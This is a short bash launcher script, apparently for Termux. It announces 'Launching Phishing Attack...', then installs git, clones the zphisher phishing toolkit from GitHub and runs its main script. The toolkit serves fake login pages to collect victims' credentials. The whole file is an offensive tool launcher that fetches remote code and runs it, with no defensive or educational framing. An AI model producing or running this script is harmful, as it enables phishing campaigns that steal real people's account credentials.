#!/bin/bash
echo "🎣 Launching Phishing Attack..."
pkg install git -y
git clone https://github.com/htr-tech/zphisher.git
cd zphisher
bash zphisher.sh
